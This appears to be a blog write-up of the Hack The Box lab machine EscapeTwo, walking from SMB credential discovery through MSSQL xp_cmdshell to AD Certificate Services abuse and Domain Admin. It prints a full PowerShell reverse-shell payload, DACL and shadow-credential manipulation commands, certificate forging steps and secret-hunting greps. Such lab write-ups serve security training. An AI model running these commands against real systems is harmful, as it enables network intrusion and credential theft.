---
title: "HTB Lab: EscapeTwo"
date: 2025-02-21 10:00:00 +0000
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2025-02-21-htb-escapetwo
categories: [Windows, HTB-Easy]
tags: [EscapeTwo, SMB, MS-SQL, xp_cmdshell, Kerberos, ADCS, Domain Escalation]
description: "A comprehensive walkthrough of exploiting the EscapeTwo HTB machine, from SMB share enumeration and leveraging MS SQL xp_cmdshell to advanced AD Certificate Services exploitation."
---
# EscapeTwo - Hack The Box

Machine Name: **EscapeTwo**  
OS: **Windows**  
Difficulty: **Easy**  
User Blood: **NLTE**  
System Blood: **NLTE**

---

## Introduction

**EscapeTwo** is a Windows Active Directory (AD) machine from Hack The Box that leverages multiple services: SMB file shares, MS SQL, and typical Windows domain ports (e.g., 53 DNS, 88 Kerberos, 445 SMB, 389 LDAP, 1433 MSSQL, etc.). The initial foothold comes from enumerating SMB shares with low-privileged credentials, finding additional credentials within `.xlsx` files, and ultimately pivoting to an `sa` SQL account which allows RCE. After pivoting again with a discovered configuration file, we escalate privileges to another user (`ryan`) and then perform advanced AD Certificate Services attacks to impersonate the Domain Admin account.

Key takeaways include:
1. **Enumeration** of Windows domain services and shares.
2. **Recovery of plain-text credentials** hidden in Office documents.
3. **Leveraging MS SQL xp_cmdshell** to get initial shell access.
4. **Abusing certificate misconfigurations** (a variation of the ESC8 or ESC4 style attacks) to forge a certificate as Domain Admin.

Let's dive in.

---

## Step 1: Network Enumeration

### Nmap Scan

A fast but thorough Nmap scan reveals typical Windows domain ports and services running on the target (here assumed to be `10.10.11.51`):

```bash
nmap -p- 10.10.11.51
```

Partial results:
```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
389/tcp   open  ldap
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ldaps
3268/tcp  open  ldap
3269/tcp  open  globalcatLDAP
1433/tcp  open  ms-sql-s
5985/tcp  open  winrm
...
```

We clearly see an Active Directory environment (Kerberos, LDAP/LDAPS, Global Catalog, etc.) plus Microsoft SQL (`1433`).

---

## Step 2: Using the Given Credentials (rose)

We are initially provided with credentials:

| **User** | **Password**       |
|----------|--------------------|
| `rose`   | `KxEPkKe6R8su`     |

### Enumerating SMB

Armed with `rose`’s username and password, we check SMB shares:

```bash
smbclient -L //10.10.11.51 -U rose -W WORKGROUP -m SMB3
```

We find several shares of interest, including:

```
Sharename                 Type
----------                ----
Accounting Department     Disk
NETLOGON                  Disk
SYSVOL                    Disk
Users                     Disk
...
```

The “Accounting Department” share stands out, so we connect:

```bash
smbclient //10.10.11.51/'Accounting Department' -U rose -W WORKGROUP -m SMB3
smb: \> ls
  .                      D        0  Sun Jun  9 06:52:21 2024
  ..                     D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx   A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx          A     6780  Sun Jun  9 06:52:07 2024
...
```

We grab both files (`.xlsx`).

```bash
smb: \> mget *
```

---

## Step 3: Extracting More Credentials from Excel Files

Office `.xlsx` files are simply ZIP archives with embedded XML. By unzipping and checking `sharedStrings.xml`, we often find interesting data:

```bash
unzip accounts.xlsx -d accounts
cat accounts/xl/sharedStrings.xml
```

We discover user/password entries:

| First Name | Last Name | Email             | Username | Password           |
|------------|-----------|-------------------|----------|--------------------|
| Angela     | Martin    | angela@sequel.htb | angela   | 0fwz7Q4mSpurIt99   |
| Oscar      | Martinez  | oscar@sequel.htb  | oscar    | 86LxLBMgEWaKUnBG   |
| Kevin      | Malone    | kevin@sequel.htb  | kevin    | Md9Wlq1E5bZnVDVo   |
| NULL       | NULL      | sa@sequel.htb     | sa       | MSSQLP@ssw0rd!     |

The main highlight is the `sa` (SQL Administrator) credentials: **`sa : MSSQLP@ssw0rd!`**. This is a critical find because port `1433/tcp` was open, indicating a likely MS SQL instance.

---

## Step 4: Exploiting MS SQL (sa Login → xp_cmdshell)

Using Metasploit’s `auxiliary/scanner/mssql/mssql_login` or a similar approach confirms `sa : MSSQLP@ssw0rd!` is valid:

```text
msf6 auxiliary(scanner/mssql/mssql_login) > set RHOSTS 10.10.11.51
msf6 auxiliary(scanner/mssql/mssql_login) > set USERNAME sa
msf6 auxiliary(scanner/mssql/mssql_login) > set PASSWORD MSSQLP@ssw0rd!
msf6 auxiliary(scanner/mssql/mssql_login) > run
[+] Login Successful: sa : MSSQLP@ssw0rd!
[+] MSSQL session 1 opened ...
```

Now we have an MS SQL interactive session. We want to enable `xp_cmdshell`:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

We see the command output:

```
sequel\sql_svc
```

This confirms we can run OS commands under the context of the service account `sql_svc`. Next, we craft a reverse shell using PowerShell:

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.3'',59812);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"'
```

**Tip:** Make sure to start a listener (e.g., `nc -lvnp 59812`) on your machine. Soon, we receive a shell as `sequel\sql_svc`.

---

## Step 5: Pivoting to `ryan`

With a shell as `sql_svc`, we hunt for interesting files. Checking `C:\SQL2019\` or enumerating various configuration/log files is standard:

```powershell
Get-ChildItem "c:\SQL2019" -recurse | where {$_.Name -match '.ini'}
```

We discover `sql-Configuration.INI` containing:

```
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SAPWD="MSSQLP@ssw0rd!"
```

Testing this password against various domain users can be a next step. Indeed, `WqSZAF6CysDQbGb3` works for the `ryan` domain account:

```bash
evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
```

This spawns a PowerShell session as `ryan`. We now have an interactive Evil-WinRM shell with more privileges than the SQL service account.

---

## Step 6: Advanced AD Certificate Services Attack

At this point, we want to escalate to Domain Admin or a similarly privileged account. Standard enumerations using Bloodhound reveals `ryan` has `WriteOwner` to the `ca_svc` account, this is interesting AD CS (Certificate Services) privileges. Alternatively, you might find the domain running an Enterprise Certificate Authority with misconfigured templates—common in advanced AD exploitation.

![](Pasted%20image%2020250221125535.png)

![](Pasted%20image%2020250221125558.png)

### 6.1 Changing Ownership and DACL

Using Impacket scripts or specialized Python tools (e.g., `owneredit.py`, `dacledit.py`, `pywhisker.py`), we can manipulate Active Directory object attributes. The gist:

1. **Take ownership** of a target account (e.g., `ca_svc`):
   ```bash
   owneredit.py -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3'
   ```

2. **Edit DACL** permissions (grant `ryan` full control):
   ```bash
   dacledit.py -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb/ryan':'WqSZAF6CysDQbGb3'
   ```

3. **Add KeyCredential to the target** using something like `pywhisker.py`, enabling a certificate-based authentication for `ca_svc`:
   ```bash
   pywhisker.py -d "sequel.htb" -u "ryan" -p "WqSZAF6CysDQbGb3" \
       --target "ca_svc" --action "add" --filename test_file --export PEM
   ```

4. **Obtain TGT via PKINIT**:
   ```bash
   python3 gettgtpkinit.py -cert-pem test_file_cert.pem \
       -key-pem test_file_priv.pem sequel.htb/ca_svc ca_svc.ccache
   ```

5. **Convert the TGT to an NT Hash**:
   ```bash
   python3 getnthash.py -key <AS-REP_Encryption_Key> sequel.htb/ca_svc
   # => Recovered NT Hash
   ```

### 6.2 Forging a Domain Admin Certificate

With tools like **Certipy**, we examine certificate templates and find one that grants high privileges (or that we can modify). We update the template:

```bash
certipy-ad template -u ca_svc@sequel.htb -target sequel.htb \
-template DunderMifflinAuthentication \
-hashes <hash>:<hash> \
-save-old
```

Then request a certificate for **`administrator@sequel.htb`**:

```bash
certipy-ad req -u ca_svc@sequel.htb -target sequel.htb \
-upn administrator@sequel.htb \
-ca sequel-DC01-CA -template DunderMifflinAuthentication \
-dc-ip 10.10.11.51 \
-hashes <hash>:<hash> \
-key-size 4096
```

Finally, we authenticate with that newly minted certificate:

```bash
certipy-ad auth -pfx administrator_10.pfx -dc-ip 10.10.11.51
```

This yields a TGT for `administrator`, and from there, we can request the NT hash or just connect directly:

```bash
evil-winrm -i 10.10.11.51 -u administrator -H <admin-nt-hash>
```

We are now **Domain Admin**.

---

## Conclusion & Tips

1. **Synchronize Your Clock**  
   When working with Kerberos-based attacks, run commands like `sudo rdate -n <DC-IP>` or `sudo ntpdate -u <DC-IP>` to ensure your local system time is in sync. Even slight time drift will cause Kerberos ticket requests to fail.

2. **Always Enumerate Shares**  
   Low-privileged SMB credentials often yield pivot points. In this case, `.xlsx` files contained multiple domain credentials.

3. **Look for Config Files**  
   Many Windows services—particularly MSSQL—store plain-text or reversible passwords in configuration (`.ini`, `.xml`) files. This gave us the `ryan` password.

4. **Master Certificate Attacks**  
   Active Directory Certificate Services can be misconfigured in numerous ways (ESC1–ESC8). Tools like `Certipy`, `pywhisker`, Impacket’s `gettgtpkinit.py`, and similar are invaluable for enumerating and exploiting these weaknesses.

5. **Practice Good Housekeeping**  
   If performing these steps in a real environment or an engagement, always revert changes (ownership, DACL) to avoid causing major disruptions.

**End Result**: We have achieved Domain Admin privileges on the **EscapeTwo** machine, capturing both the user and root/administrator flags.

---

Below is an additional section highlighting the main GitHub repositories for the tools used throughout the attack chain. Referencing the original source of each tool can help you install, update, and learn more about usage, flags, and community-driven improvements.

---

## GitHub Tools and References

Below is a list of the primary tools employed during this exploitation and privilege escalation chain, along with their respective GitHub links:

1. **Nmap**  
   - **Link**: [https://github.com/nmap/nmap](https://github.com/nmap/nmap)  
   - Used for port scanning and service enumeration.

2. **SMBClient** (Part of the [Samba](https://www.samba.org/) suite)  
   - **Link**: [https://github.com/samba-team/samba](https://github.com/samba-team/samba)  
   - Used to enumerate and retrieve files from SMB shares.

3. **Metasploit Framework**  
   - **Link**: [https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)  
   - The `auxiliary/scanner/mssql/mssql_login` module was used to confirm MSSQL credentials and gain an MSSQL session.

4. **Evil-WinRM**  
   - **Link**: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)  
   - Used to obtain interactive PowerShell sessions on the target Windows machine.

5. **Impacket**  
   - **Link**: [https://github.com/fortra/impacket](https://github.com/fortra/impacket)  
   - A collection of Python scripts for network protocols. Often includes scripts like `getST.py`, `getTGT.py`, `psexec.py`, and similar.  
   - Many AD-related scripts (including older or alternate `owneredit.py` / `dacledit.py` / `gettgtpkinit.py` variants) live either here or in closely related repositories.

6. **PKINITtools** by Dirk-jan M.  
   - **Link**: [https://github.com/dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)  
   - Contains `gettgtpkinit.py` and `getnthash.py`, used to perform certificate-based Kerberos authentication (PKINIT) and extract NT hashes from TGTs.

7. **Certipy**  
   - **Link**: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)  
   - Comprehensive AD CS toolkit for enumeration and abuse of certificate services (e.g., `certipy-ad find`, `certipy-ad auth`, `certipy-ad req`, and `certipy-ad template`).

8. **pywhisker**  
   - **Link**: [https://github.com/TheD1rkMtr/pywhisker](https://github.com/TheD1rkMtr/pywhisker)  
   - A tool for manipulating KeyCredentials in AD, allowing you to add or remove certificate-based keys (e.g., “Shadow Credentials” technique).  

Any scripts or commands (e.g., `owneredit.py`, `dacledit.py`, etc.) that do not explicitly show up in the above projects often originate from variants found in Impacket forks or specialized AD exploitation toolkits. They typically function similarly: editing ACLs, owners, or performing Shadow Credentials–style attacks.

> **Tip**: Always consult the README and wiki pages on these GitHub repositories for the most accurate, up-to-date commands and usage examples.

---
### Quick “CTF”-Style Commands Recap

- **Recursive Grep for Secrets**:
  ```bash
  grep -r -i -E "config|password|ini|passwd|pwd|hash|secret|key|token|credentials|auth" / 2>/dev/null
  ```
- **Finding Potential Config Files**:
  ```bash
  find / -type f \( -iname "*config*" -o -iname "*ini*" -o -iname "*secret*" ... \) 2>/dev/null
  ```

---

## Final Thoughts

**EscapeTwo** showcases how simple credential leaks (in an `.xlsx` file) and a misconfigured MS SQL service can lead to a full domain compromise when combined with knowledge of Active Directory, certificate misconfigurations, and Kerberos PKINIT-based exploits. 

Learning points:
- Thorough enumeration yields valuable footholds in Windows AD.
- MSSQL’s `xp_cmdshell` remains a powerful pivot method.
- AD CS misconfigurations are a growing vector for domain escalation.

With the Domain Admin shell in hand, you have effectively “escaped” from every limitation on the box—thus living up to the name **EscapeTwo**!